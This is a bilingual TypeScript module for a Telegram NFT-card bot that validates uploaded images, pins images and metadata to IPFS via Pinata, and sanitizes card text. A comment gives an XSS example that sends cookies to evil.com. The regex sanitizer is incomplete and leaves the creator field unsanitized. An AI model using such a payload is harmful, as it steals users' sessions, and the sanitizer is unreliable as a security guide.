// =============================================================================
// SERVIZIO IPFS - Caricamento immagini e metadati su IPFS
// IPFS SERVICE - Image and metadata upload to IPFS
// =============================================================================
//
// Questo modulo gestisce l'interazione tra il bot Telegram e il protocollo IPFS
// (InterPlanetary File System). IPFS è un sistema di archiviazione decentralizzato:
// invece di salvare file su un server centrale, i file vengono distribuiti su una
// rete di nodi peer-to-peer. Ogni file caricato riceve un "hash" unico (CID) che
// funziona come un'impronta digitale — se il contenuto cambia, cambia anche l'hash.
// Questo garantisce che le immagini e i metadati delle carte NFT siano immutabili.
//
// This module handles the interaction between the Telegram bot and the IPFS protocol
// (InterPlanetary File System). IPFS is a decentralized storage system: instead of
// saving files on a central server, files are distributed across a peer-to-peer
// network of nodes. Every uploaded file receives a unique "hash" (CID) that works
// like a fingerprint — if the content changes, the hash changes too. This ensures
// that NFT card images and metadata are immutable and tamper-proof.
//
// Usiamo Pinata come "pinning service" — un servizio che garantisce che i nostri
// file rimangano disponibili sulla rete IPFS. Senza pinning, i file potrebbero
// essere rimossi dalla rete durante la garbage collection.
//
// We use Pinata as a "pinning service" — a service that ensures our files remain
// available on the IPFS network. Without pinning, files could be removed from the
// network during garbage collection.
//
// Flusso tipico / Typical flow:
//   1. L'utente invia una foto su Telegram / User sends a photo on Telegram
//   2. Il bot scarica la foto dai server Telegram / Bot downloads the photo from Telegram servers
//   3. L'immagine viene validata (dimensioni, formato) / Image is validated (size, format)
//   4. L'immagine viene caricata su IPFS via Pinata / Image is uploaded to IPFS via Pinata
//   5. Si costruiscono i metadati NFT con il riferimento all'immagine / NFT metadata is built with the image reference
//   6. I metadati JSON vengono caricati su IPFS / JSON metadata is uploaded to IPFS
//   7. L'hash dei metadati diventa il tokenURI sulla blockchain / Metadata hash becomes the tokenURI on the blockchain
// =============================================================================

import { Readable } from "stream";
import { Bot } from "grammy";
import { pinata } from "../contracts/provider.js";
import {
  MAX_IMAGE_SIZE_BYTES, ALLOWED_IMAGE_TYPES,
  MAX_NAME_LENGTH, IPFS_GATEWAYS, POKEMON_TYPES, RARITIES
} from "../config.js";
import { BOT_TOKEN } from "../config.js";
import type { MyContext } from "../types.js";
import type { NFTMetadata, CardDraft } from "../storage/types.js";

// =============================================================================
// RILEVAMENTO E VALIDAZIONE IMMAGINI
// IMAGE DETECTION AND VALIDATION
// =============================================================================
//
// Prima di caricare qualsiasi immagine su IPFS, dobbiamo verificare che sia un
// file valido e sicuro. Non ci fidiamo dell'estensione del file (che può essere
// falsificata): controlliamo i "magic bytes" — i primi byte di ogni file che
// identificano il formato reale. Questo previene attacchi in cui un utente
// potrebbe caricare un file eseguibile mascherato da immagine.
//
// Before uploading any image to IPFS, we must verify it is a valid and safe file.
// We don't trust the file extension (which can be faked): we check the "magic bytes"
// — the first bytes of every file that identify the actual format. This prevents
// attacks where a user could upload an executable file disguised as an image.
// =============================================================================

/**
 * Rileva il tipo di immagine dai magic bytes.
 * Detects image type from magic bytes.
 *
 * Ogni formato immagine inizia con una sequenza di byte specifica — una sorta di
 * "firma" digitale. Ad esempio, un file JPEG inizia sempre con 0xFF 0xD8 0xFF,
 * mentre un PNG inizia con 0x89 0x50 0x4E 0x47 (che corrisponde a ".PNG" in ASCII).
 * Controllare questi byte è molto più sicuro che fidarsi dell'estensione del file.
 *
 * Every image format starts with a specific byte sequence — a kind of digital
 * "signature". For example, a JPEG file always starts with 0xFF 0xD8 0xFF,
 * while a PNG starts with 0x89 0x50 0x4E 0x47 (which corresponds to ".PNG" in ASCII).
 * Checking these bytes is much safer than trusting the file extension.
 *
 * @param buffer - I byte grezzi del file / The raw file bytes
 * @returns Il tipo MIME rilevato (es. "image/jpeg") o null se non riconosciuto /
 *          The detected MIME type (e.g. "image/jpeg") or null if unrecognized
 */
export function detectImageType(buffer: Buffer): string | null {
  // Servono almeno 12 byte per rilevare tutti i formati supportati (WebP ne richiede 12)
  // We need at least 12 bytes to detect all supported formats (WebP requires 12)
  if (buffer.length < 12) return null;

  // JPEG: inizia con FF D8 FF (Start Of Image marker)
  // JPEG: starts with FF D8 FF (Start Of Image marker)
  if (buffer[0] === 0xFF && buffer[1] === 0xD8 && buffer[2] === 0xFF) return "image/jpeg";

  // PNG: inizia con la signature fissa 89 50 4E 47 0D 0A 1A 0A
  // PNG: starts with the fixed signature 89 50 4E 47 0D 0A 1A 0A
  if (buffer[0] === 0x89 && buffer[1] === 0x50 && buffer[2] === 0x4E && buffer[3] === 0x47 &&
      buffer[4] === 0x0D && buffer[5] === 0x0A && buffer[6] === 0x1A && buffer[7] === 0x0A) return "image/png";

  // GIF: inizia con "GIF8" (sia GIF87a che GIF89a)
  // GIF: starts with "GIF8" (both GIF87a and GIF89a)
  if (buffer[0] === 0x47 && buffer[1] === 0x49 && buffer[2] === 0x46 && buffer[3] === 0x38) return "image/gif";

  // WebP: inizia con "RIFF" (byte 0-3) e "WEBP" (byte 8-11) — è un container RIFF
  // WebP: starts with "RIFF" (bytes 0-3) and "WEBP" (bytes 8-11) — it's a RIFF container
  if (buffer[0] === 0x52 && buffer[1] === 0x49 && buffer[2] === 0x46 && buffer[3] === 0x46 &&
      buffer[8] === 0x57 && buffer[9] === 0x45 && buffer[10] === 0x42 && buffer[11] === 0x50) return "image/webp";

  // Formato non riconosciuto — potrebbe essere un file non-immagine
  // Unrecognized format — could be a non-image file
  return null;
}

/**
 * Valida il buffer di un'immagine per motivi di sicurezza.
 * Validates an image buffer for security reasons.
 *
 * Questa funzione è il "guardiano" che impedisce il caricamento di file pericolosi
 * o troppo grandi su IPFS. Ogni immagine deve superare tre controlli:
 *   1. Non deve superare la dimensione massima consentita (per evitare costi eccessivi di storage)
 *   2. Non deve essere vuota (un file vuoto su IPFS sarebbe inutile e sospetto)
 *   3. Deve essere un formato immagine valido e consentito (JPEG, PNG, GIF, WebP)
 *
 * This function is the "gatekeeper" that prevents dangerous or oversized files from
 * being uploaded to IPFS. Every image must pass three checks:
 *   1. Must not exceed the maximum allowed size (to avoid excessive storage costs)
 *   2. Must not be empty (an empty file on IPFS would be useless and suspicious)
 *   3. Must be a valid and allowed image format (JPEG, PNG, GIF, WebP)
 *
 * @param buffer - I byte dell'immagine da validare / The image bytes to validate
 * @param context - Descrizione per messaggi di errore (es. "Downloaded image") /
 *                  Description for error messages (e.g. "Downloaded image")
 * @throws Error se l'immagine non supera la validazione / Error if the image fails validation
 */
export function validateImageBuffer(buffer: Buffer, context: string = "image"): void {
  // Controllo dimensione — protegge da upload troppo grandi che costerebbero troppo su IPFS
  // Size check — protects against oversized uploads that would cost too much on IPFS
  if (buffer.length > MAX_IMAGE_SIZE_BYTES) {
    const sizeMB = (buffer.length / (1024 * 1024)).toFixed(2);
    const maxMB = (MAX_IMAGE_SIZE_BYTES / (1024 * 1024)).toFixed(0);
    throw new Error(`${context} is too large (${sizeMB}MB). Maximum size is ${maxMB}MB.`);
  }

  // Controllo file vuoto — un file di 0 byte non ha senso come immagine NFT
  // Empty file check — a 0-byte file makes no sense as an NFT image
  if (buffer.length === 0) {
    throw new Error(`${context} is empty.`);
  }

  // Controllo formato tramite magic bytes (non ci fidiamo dell'estensione)
  // Format check via magic bytes (we don't trust the file extension)
  const detectedType = detectImageType(buffer);
  if (!detectedType) {
    throw new Error(`${context} is not a valid image format. Allowed: JPEG, PNG, GIF, WebP.`);
  }

  // Verifica che il formato rilevato sia nella lista dei formati consentiti
  // Verify that the detected format is in the list of allowed formats
  if (!ALLOWED_IMAGE_TYPES.includes(detectedType as typeof ALLOWED_IMAGE_TYPES[number])) {
    throw new Error(`${context} type "${detectedType}" is not allowed. Allowed: JPEG, PNG, GIF, WebP.`);
  }
}

// =============================================================================
// DOWNLOAD IMMAGINI DA TELEGRAM
// IMAGE DOWNLOAD FROM TELEGRAM
// =============================================================================
//
// Quando un utente invia una foto al bot, Telegram non ci dà direttamente i byte
// dell'immagine. Invece, ci dà un "file_id" — un identificatore temporaneo che
// possiamo usare per scaricare il file dai server di Telegram. Questo è un
// meccanismo di sicurezza di Telegram: i file sono ospitati sui loro server e
// accessibili solo tramite il token del bot.
//
// When a user sends a photo to the bot, Telegram doesn't give us the image bytes
// directly. Instead, it gives us a "file_id" — a temporary identifier we can use
// to download the file from Telegram's servers. This is a Telegram security mechanism:
// files are hosted on their servers and accessible only via the bot token.
// =============================================================================

/**
 * Scarica una foto da Telegram dato il file_id.
 * Downloads a photo from Telegram given the file_id.
 *
 * Il processo in due fasi di Telegram:
 *   1. getFile(file_id) → ottiene il percorso del file sui server Telegram
 *   2. fetch(download_url) → scarica i byte effettivi dell'immagine
 * Dopo il download, l'immagine viene immediatamente validata prima di essere usata.
 *
 * Telegram's two-step process:
 *   1. getFile(file_id) → gets the file path on Telegram servers
 *   2. fetch(download_url) → downloads the actual image bytes
 * After downloading, the image is immediately validated before use.
 *
 * @param bot - L'istanza del bot Telegram (per accedere all'API) / The Telegram bot instance (to access the API)
 * @param fileId - L'identificatore univoco del file su Telegram / The unique file identifier on Telegram
 * @returns Il buffer con i byte dell'immagine scaricata e validata /
 *          The buffer with the downloaded and validated image bytes
 * @throws Error se il download fallisce o l'immagine non è valida /
 *         Error if the download fails or the image is not valid
 */
export async function downloadPhotoFromTelegram(bot: Bot<MyContext>, fileId: string): Promise<Buffer> {
  // Fase 1: Chiedi a Telegram il percorso del file usando il file_id
  // Step 1: Ask Telegram for the file path using the file_id
  const file = await bot.api.getFile(fileId);
  const filePath = file.file_path;

  if (!filePath) {
    throw new Error("Could not get file path from Telegram");
  }

  // Fase 2: Costruisci l'URL di download e scarica i byte dell'immagine
  // Step 2: Build the download URL and fetch the image bytes
  const downloadUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${filePath}`;
  const response = await fetch(downloadUrl);

  if (!response.ok) {
    throw new Error(`Failed to download: ${response.statusText}`);
  }

  // Converti la risposta in un Buffer (array di byte) per la manipolazione
  // Convert the response to a Buffer (byte array) for manipulation
  const arrayBuffer = await response.arrayBuffer();
  const buffer = Buffer.from(arrayBuffer);

  // Valida immediatamente — non vogliamo propagare file corrotti o malevoli
  // Validate immediately — we don't want to propagate corrupt or malicious files
  validateImageBuffer(buffer, "Downloaded image");

  return buffer;
}

// =============================================================================
// UPLOAD SU IPFS VIA PINATA
// UPLOAD TO IPFS VIA PINATA
// =============================================================================
//
// Pinata è il nostro "pinning service" — un intermediario che facilita il caricamento
// di file su IPFS e garantisce che rimangano disponibili. Quando carichiamo un file:
//   1. Pinata lo aggiunge alla rete IPFS e lo "pinna" (lo tiene in memoria permanente)
//   2. IPFS calcola un hash crittografico del contenuto (CID - Content Identifier)
//   3. Questo CID è l'indirizzo permanente del file sulla rete IPFS
//
// Pinata is our "pinning service" — an intermediary that facilitates uploading files
// to IPFS and ensures they remain available. When we upload a file:
//   1. Pinata adds it to the IPFS network and "pins" it (keeps it in permanent storage)
//   2. IPFS calculates a cryptographic hash of the content (CID - Content Identifier)
//   3. This CID is the permanent address of the file on the IPFS network
//
// Carichiamo due tipi di dati / We upload two types of data:
//   - Immagini (binario) → uploadImageToPinata / Images (binary) → uploadImageToPinata
//   - Metadati (JSON) → uploadMetadataToPinata / Metadata (JSON) → uploadMetadataToPinata
// =============================================================================

/**
 * Carica un'immagine su Pinata/IPFS.
 * Uploads an image to Pinata/IPFS.
 *
 * L'immagine viene convertita in un ReadableStream perché l'SDK di Pinata
 * accetta stream (non buffer diretti). Usiamo CID versione 1, che è il formato
 * più moderno e inizia con "bafy..." invece del vecchio formato "Qm...".
 *
 * The image is converted to a ReadableStream because Pinata's SDK accepts
 * streams (not direct buffers). We use CID version 1, which is the more
 * modern format starting with "bafy..." instead of the legacy "Qm..." format.
 *
 * @param imageBuffer - I byte dell'immagine da caricare / The image bytes to upload
 * @param fileName - Nome del file per i metadati di Pinata (organizzazione interna) /
 *                   File name for Pinata metadata (internal organization)
 * @returns L'hash IPFS (CID) dell'immagine caricata / The IPFS hash (CID) of the uploaded image
 * @throws Error se Pinata non è configurato o il caricamento fallisce /
 *         Error if Pinata is not configured or the upload fails
 */
export async function uploadImageToPinata(imageBuffer: Buffer, fileName: string): Promise<string> {
  if (!pinata) throw new Error("Pinata not configured");

  // Valida prima di caricare — doppio controllo per sicurezza
  // Validate before uploading — double check for safety
  validateImageBuffer(imageBuffer, "Image for upload");

  // Converti il Buffer in un ReadableStream come richiesto dall'SDK di Pinata
  // Convert the Buffer to a ReadableStream as required by Pinata's SDK
  const readableStream = Readable.from(imageBuffer);

  // Carica su IPFS tramite Pinata con CID v1 (formato moderno)
  // Upload to IPFS via Pinata with CID v1 (modern format)
  const result = await pinata.pinFileToIPFS(readableStream, {
    pinataMetadata: { name: fileName },
    pinataOptions: { cidVersion: 1 }
  });

  return result.IpfsHash;
}

/**
 * Carica i metadata JSON su Pinata/IPFS.
 * Uploads JSON metadata to Pinata/IPFS.
 *
 * I metadati NFT sono un oggetto JSON che segue standard come ERC-721.
 * Contengono il nome della carta, la descrizione, il link all'immagine su IPFS,
 * e gli attributi (stats, tipo, rarità, creatore). Questo JSON viene caricato
 * separatamente su IPFS e il suo hash diventa il "tokenURI" memorizzato sulla blockchain.
 *
 * NFT metadata is a JSON object following standards like ERC-721.
 * It contains the card name, description, link to the image on IPFS,
 * and attributes (stats, type, rarity, creator). This JSON is uploaded
 * separately to IPFS and its hash becomes the "tokenURI" stored on the blockchain.
 *
 * @param metadata - L'oggetto metadati NFT completo / The complete NFT metadata object
 * @param cardName - Nome della carta (per identificare il file su Pinata) /
 *                   Card name (to identify the file on Pinata)
 * @returns L'hash IPFS (CID) dei metadati caricati / The IPFS hash (CID) of the uploaded metadata
 * @throws Error se Pinata non è configurato o il caricamento fallisce /
 *         Error if Pinata is not configured or the upload fails
 */
export async function uploadMetadataToPinata(metadata: NFTMetadata, cardName: string): Promise<string> {
  if (!pinata) throw new Error("Pinata not configured");

  // pinJSONToIPFS serializza automaticamente l'oggetto in JSON e lo carica su IPFS
  // pinJSONToIPFS automatically serializes the object to JSON and uploads it to IPFS
  const result = await pinata.pinJSONToIPFS(metadata, {
    pinataMetadata: { name: `${cardName}-metadata.json` }
  });

  return result.IpfsHash;
}

// =============================================================================
// COSTRUZIONE METADATI NFT
// NFT METADATA CONSTRUCTION
// =============================================================================
//
// I metadati NFT seguono lo standard ERC-721 metadata, che definisce come
// marketplace come OpenSea e Rarible visualizzano le informazioni di un NFT.
// La struttura include:
//   - name: il nome visualizzato dell'NFT
//   - description: una descrizione testuale
//   - image: URL dell'immagine (nel nostro caso, un link IPFS)
//   - external_url: link al sito del progetto
//   - attributes: array di trait (caratteristiche) come HP, Attacco, ecc.
//
// NFT metadata follows the ERC-721 metadata standard, which defines how
// marketplaces like OpenSea and Rarible display NFT information.
// The structure includes:
//   - name: the displayed name of the NFT
//   - description: a textual description
//   - image: image URL (in our case, an IPFS link)
//   - external_url: link to the project website
//   - attributes: array of traits (characteristics) like HP, Attack, etc.
// =============================================================================

/**
 * Costruisce i metadata NFT per IPFS a partire da un draft.
 * Builds NFT metadata for IPFS from a draft.
 *
 * Questa funzione trasforma i dati grezzi del draft (inseriti dall'utente nel bot)
 * in un oggetto JSON conforme allo standard ERC-721 metadata. Ogni attributo viene
 * sanitizzato per prevenire attacchi XSS (Cross-Site Scripting) e injection — essendo
 * i metadati visualizzati su marketplace web, input malevoli potrebbero eseguire
 * codice nel browser di chi visualizza la carta.
 *
 * This function transforms raw draft data (entered by the user in the bot)
 * into a JSON object compliant with the ERC-721 metadata standard. Every attribute
 * is sanitized to prevent XSS (Cross-Site Scripting) and injection attacks — since
 * metadata is displayed on web marketplaces, malicious input could execute code in
 * the browser of anyone viewing the card.
 *
 * I campi "max_value" negli attributi numerici (HP, Attack, ecc.) dicono ai
 * marketplace come visualizzare le barre di progresso — 255 è il massimo possibile.
 *
 * The "max_value" fields in numeric attributes (HP, Attack, etc.) tell marketplaces
 * how to display progress bars — 255 is the maximum possible value.
 *
 * @param draft - Il draft della carta con tutti i dati inseriti dall'utente /
 *                The card draft with all user-entered data
 * @param imageIpfsHash - L'hash CID dell'immagine già caricata su IPFS /
 *                        The CID hash of the image already uploaded to IPFS
 * @returns L'oggetto metadata NFT pronto per il caricamento su IPFS /
 *          The NFT metadata object ready for upload to IPFS
 */
export function buildNFTMetadata(draft: CardDraft, imageIpfsHash: string): NFTMetadata {
  // Sanitizza nome e descrizione per prevenire XSS nei marketplace
  // Sanitize name and description to prevent XSS in marketplaces
  const sanitizedName = sanitizeCardName(draft.cardName);
  const sanitizedDescription = sanitizeCardDescription(
    draft.description || `Custom Pokemon card by ${sanitizeForMetadata(draft.creatorName, MAX_NAME_LENGTH)}`
  );

  return {
    name: sanitizedName,
    description: sanitizedDescription,
    // L'immagine è referenziata con il protocollo ipfs:// — i marketplace e i wallet
    // sanno come risolvere questo URL scaricando da un gateway IPFS
    // The image is referenced using the ipfs:// protocol — marketplaces and wallets
    // know how to resolve this URL by downloading from an IPFS gateway
    image: `ipfs://${imageIpfsHash}`,
    external_url: "https://pokedex.app",
    // Ogni attributo è un "trait" visualizzato nelle pagine dei marketplace
    // Each attribute is a "trait" displayed on marketplace pages
    attributes: [
      { trait_type: "HP", value: draft.stats.hp, max_value: 255 },
      { trait_type: "Attack", value: draft.stats.attack, max_value: 255 },
      { trait_type: "Defense", value: draft.stats.defense, max_value: 255 },
      { trait_type: "Speed", value: draft.stats.speed, max_value: 255 },
      { trait_type: "Type", value: POKEMON_TYPES[draft.stats.pokemonType] || "Normal" },
      { trait_type: "Rarity", value: RARITIES[draft.stats.rarity]?.name || "Common" },
      { trait_type: "Creator", value: draft.creatorName },
    ]
  };
}

// =============================================================================
// CONVERSIONE URL IPFS
// IPFS URL CONVERSION
// =============================================================================
//
// Gli URL IPFS (ipfs://QmXyz...) non sono direttamente accessibili dai browser web.
// Per visualizzare le immagini e i metadati, dobbiamo convertirli in URL HTTPS
// usando un "gateway" — un server che fa da ponte tra il web tradizionale e la rete IPFS.
//
// Esempio di conversione / Conversion example:
//   ipfs://bafybeigdyrzt5sfp7udm7hu76uh7y26nf3efnfm6ql7v6ji5lhx →
//   https://gateway.pinata.cloud/ipfs/bafybeigdyrzt5sfp7udm7hu76uh7y26nf3efnfm6ql7v6ji5lhx
//
// IPFS URLs (ipfs://QmXyz...) are not directly accessible from web browsers.
// To display images and metadata, we must convert them to HTTPS URLs using a
// "gateway" — a server that bridges between the traditional web and the IPFS network.
// =============================================================================

/**
 * Converte un URL IPFS in HTTPS tramite gateway.
 * Converts an IPFS URL to HTTPS via gateway.
 *
 * Gestisce i tre formati comuni di riferimenti IPFS:
 *   1. ipfs://CID — il formato standard usato nei metadati NFT
 *   2. /ipfs/CID — il formato path usato da alcuni sistemi
 *   3. CID nudo (inizia con "Qm" o "bafy") — solo l'hash senza prefisso
 * Se l'URL è già HTTPS, lo restituisce invariato.
 *
 * Handles the three common formats of IPFS references:
 *   1. ipfs://CID — the standard format used in NFT metadata
 *   2. /ipfs/CID — the path format used by some systems
 *   3. Bare CID (starts with "Qm" or "bafy") — just the hash without prefix
 * If the URL is already HTTPS, it returns it unchanged.
 *
 * @param ipfsUrl - L'URL IPFS in qualsiasi formato supportato / The IPFS URL in any supported format
 * @returns L'URL HTTPS accessibile dal browser / The browser-accessible HTTPS URL
 */
export function ipfsToHttps(ipfsUrl: string): string {
  if (!ipfsUrl) return "";

  // Formato standard: ipfs://bafyabc123...
  // Standard format: ipfs://bafyabc123...
  if (ipfsUrl.startsWith("ipfs://")) {
    return `${IPFS_GATEWAYS[0]}${ipfsUrl.replace("ipfs://", "")}`;
  }

  // Formato path: /ipfs/bafyabc123...
  // Path format: /ipfs/bafyabc123...
  if (ipfsUrl.startsWith("/ipfs/")) {
    return `${IPFS_GATEWAYS[0]}${ipfsUrl.replace("/ipfs/", "")}`;
  }

  // CID nudo: Qm... (v0) o bafy... (v1) — riconosciuti tramite regex
  // Bare CID: Qm... (v0) or bafy... (v1) — recognized via regex
  if (ipfsUrl.match(/^(Qm|bafy)/i)) {
    return `${IPFS_GATEWAYS[0]}${ipfsUrl}`;
  }

  // Già HTTPS o altro formato — restituisci invariato
  // Already HTTPS or other format — return unchanged
  return ipfsUrl;
}

/**
 * Scarica e parsa i metadata NFT da un tokenURI.
 * Fetches and parses NFT metadata from a tokenURI.
 *
 * Questa funzione è usata quando vogliamo mostrare le informazioni di una carta
 * già mintata sulla blockchain. Il tokenURI (memorizzato on-chain) punta a un file
 * JSON su IPFS contenente nome, descrizione e URL dell'immagine. Lo scarichiamo,
 * lo parsiamo e convertiamo eventuali link IPFS in HTTPS per la visualizzazione.
 *
 * This function is used when we want to display information about a card already
 * minted on the blockchain. The tokenURI (stored on-chain) points to a JSON file
 * on IPFS containing name, description and image URL. We download it, parse it,
 * and convert any IPFS links to HTTPS for display.
 *
 * Il timeout di 10 secondi protegge da gateway IPFS lenti o irraggiungibili —
 * non vogliamo che il bot resti bloccato in attesa di una risposta che non arriva.
 *
 * The 10-second timeout protects against slow or unreachable IPFS gateways —
 * we don't want the bot to hang waiting for a response that never comes.
 *
 * @param tokenURI - L'URI dei metadati (solitamente un URL IPFS) / The metadata URI (usually an IPFS URL)
 * @returns I metadati parsati con nome, descrizione e immagine, o null in caso di errore /
 *          Parsed metadata with name, description and image, or null on error
 */
export async function fetchNFTMetadata(tokenURI: string): Promise<{ name?: string; description?: string; image?: string } | null> {
  try {
    // Converte ipfs://... in https://gateway.pinata.cloud/ipfs/... per il fetch HTTP
    // Converts ipfs://... to https://gateway.pinata.cloud/ipfs/... for HTTP fetch
    const httpUrl = ipfsToHttps(tokenURI);
    // Timeout di 10 secondi per evitare che il bot resti bloccato su gateway lenti
    // 10-second timeout to prevent the bot from hanging on slow gateways
    const response = await fetch(httpUrl, { signal: AbortSignal.timeout(10000) });

    if (!response.ok) return null;

    const metadata = await response.json() as { name?: string; description?: string; image?: string };
    return {
      name: metadata.name,
      description: metadata.description,
      // Converte anche l'URL dell'immagine se è un riferimento IPFS
      // Also converts the image URL if it's an IPFS reference
      image: metadata.image ? ipfsToHttps(metadata.image) : undefined
    };
  } catch (error) {
    console.error("Error fetching NFT metadata:", error);
    return null;
  }
}

// =============================================================================
// SANITIZZAZIONE INPUT - Previene XSS e injection
// INPUT SANITIZATION - Prevents XSS and injection attacks
// =============================================================================
//
// La sanitizzazione è FONDAMENTALE per la sicurezza. I metadati NFT vengono
// visualizzati su marketplace web (come OpenSea), nel bot Telegram e nelle dApp.
// Se un utente inserisce codice HTML o JavaScript nel nome di una carta, questo
// codice potrebbe essere eseguito nel browser di chi visualizza la carta (XSS).
//
// Esempio di attacco:
//   Nome carta: <script>document.location='https://evil.com?cookie='+document.cookie</script>
//   Se non sanitizzato, questo ruberebbe i cookie di chi visualizza la carta!
//
// Sanitization is CRITICAL for security. NFT metadata is displayed on web
// marketplaces (like OpenSea), in the Telegram bot, and in dApps. If a user
// inserts HTML or JavaScript code in a card name, that code could be executed
// in the browser of anyone viewing the card (XSS).
//
// Attack example:
//   Card name: <script>document.location='https://evil.com?cookie='+document.cookie</script>
//   If not sanitized, this would steal cookies from anyone viewing the card!
// =============================================================================

/**
 * Sanitizza testo per uso sicuro nei metadata NFT.
 * Sanitizes text for safe use in NFT metadata.
 *
 * Rimuove in ordine:
 *   1. Tag HTML generici (<div>, <span>, ecc.) — previene injection HTML
 *   2. Tag <script> con contenuto — previene esecuzione JavaScript
 *   3. Event handler inline (onclick, onload, ecc.) — previene esecuzione JS tramite eventi
 *   4. Protocolli pericolosi (javascript:, data:) — previene esecuzione tramite URL
 *   5. Spazi multipli → uno solo — normalizza il testo
 *   6. Tronca alla lunghezza massima — previene payload oversize
 *
 * Removes in order:
 *   1. Generic HTML tags (<div>, <span>, etc.) — prevents HTML injection
 *   2. <script> tags with content — prevents JavaScript execution
 *   3. Inline event handlers (onclick, onload, etc.) — prevents JS execution via events
 *   4. Dangerous protocols (javascript:, data:) — prevents execution via URLs
 *   5. Multiple spaces → single space — normalizes the text
 *   6. Truncates to max length — prevents oversized payloads
 *
 * @param text - Il testo da sanitizzare / The text to sanitize
 * @param maxLength - Lunghezza massima consentita (default: 500 caratteri) /
 *                    Maximum allowed length (default: 500 characters)
 * @returns Il testo sanitizzato e troncato / The sanitized and truncated text
 */
export function sanitizeForMetadata(text: string, maxLength: number = 500): string {
  if (!text || typeof text !== "string") return "";

  return text
    .replace(/<[^>]*>/g, "")                              // Rimuovi tag HTML / Remove HTML tags
    .replace(/<script[^>]*>.*?<\/script>/gi, "")           // Rimuovi <script> / Remove <script>
    .replace(/on\w+\s*=\s*["'][^"']*["']/gi, "")          // Rimuovi event handlers / Remove event handlers
    .replace(/javascript:/gi, "")                          // Rimuovi protocollo javascript: / Remove javascript: protocol
    .replace(/data:/gi, "")                                // Rimuovi protocollo data: / Remove data: protocol
    .replace(/\s+/g, " ")                                  // Normalizza spazi / Normalize spaces
    .trim()
    .slice(0, maxLength);
}

/**
 * Sanitizza testo per visualizzazione sicura in Telegram Markdown.
 * Sanitizes text for safe display in Telegram Markdown.
 *
 * Telegram usa MarkdownV2 che ha caratteri speciali con significato sintattico.
 * Se il nome di una carta contiene ad esempio un asterisco (*), Telegram lo
 * interpreterebbe come bold. Questa funzione "escappa" tutti i caratteri speciali
 * aggiungendo un backslash davanti, così vengono visualizzati letteralmente.
 *
 * Telegram uses MarkdownV2 which has special characters with syntactic meaning.
 * If a card name contains e.g. an asterisk (*), Telegram would interpret it as
 * bold. This function "escapes" all special characters by adding a backslash
 * in front, so they are displayed literally.
 *
 * @param text - Il testo da rendere sicuro per Telegram / The text to make safe for Telegram
 * @returns Il testo con i caratteri speciali escaped / The text with special characters escaped
 */
export function sanitizeForMarkdown(text: string): string {
  if (!text || typeof text !== "string") return "";

  // Ogni carattere speciale di MarkdownV2 viene preceduto da un backslash
  // Every MarkdownV2 special character is preceded by a backslash
  return text
    .replace(/[_*\[\]()~`>#+=|{}.!-]/g, "\\$&")
    .trim();
}

/**
 * Valida e sanitizza il nome di una carta.
 * Validates and sanitizes a card name.
 *
 * Il nome della carta è il dato più visibile — appare sui marketplace, nel wallet
 * e ovunque la carta venga visualizzata. Oltre alla sanitizzazione XSS standard,
 * rimuoviamo anche caratteri non alfanumerici insoliti per mantenere i nomi puliti
 * e leggibili. Sono consentiti solo lettere, numeri, spazi, trattini, apostrofi,
 * punti esclamativi, punti interrogativi e punti.
 *
 * The card name is the most visible data — it appears on marketplaces, in wallets,
 * and everywhere the card is displayed. Beyond standard XSS sanitization, we also
 * remove unusual non-alphanumeric characters to keep names clean and readable.
 * Only letters, numbers, spaces, hyphens, apostrophes, exclamation marks,
 * question marks and periods are allowed.
 *
 * @param name - Il nome grezzo della carta / The raw card name
 * @returns Il nome sanitizzato / The sanitized name
 * @throws Error se il nome è vuoto dopo la sanitizzazione / Error if the name is empty after sanitization
 */
export function sanitizeCardName(name: string): string {
  // Prima applica la sanitizzazione generale (anti-XSS) con limite di 50 caratteri
  // First apply general sanitization (anti-XSS) with 50-character limit
  const sanitized = sanitizeForMetadata(name, 50);
  if (sanitized.length === 0) {
    throw new Error("Card name cannot be empty after sanitization");
  }
  // Poi rimuovi caratteri non consentiti — solo alfanumerici e pochi simboli
  // Then remove disallowed characters — only alphanumeric and a few symbols
  return sanitized.replace(/[^a-zA-Z0-9\s\-'!?.]/g, "").trim();
}

/**
 * Valida e sanitizza la descrizione di una carta.
 * Validates and sanitizes a card description.
 *
 * La descrizione ha regole meno restrittive del nome — consentiamo fino a 500
 * caratteri e non filtriamo i caratteri speciali (solo la sanitizzazione anti-XSS).
 * Questo perché le descrizioni possono contenere testo più ricco e vario.
 *
 * The description has less restrictive rules than the name — we allow up to 500
 * characters and don't filter special characters (only anti-XSS sanitization).
 * This is because descriptions can contain richer and more varied text.
 *
 * @param description - La descrizione grezza della carta / The raw card description
 * @returns La descrizione sanitizzata / The sanitized description
 */
export function sanitizeCardDescription(description: string): string {
  return sanitizeForMetadata(description, 500);
}
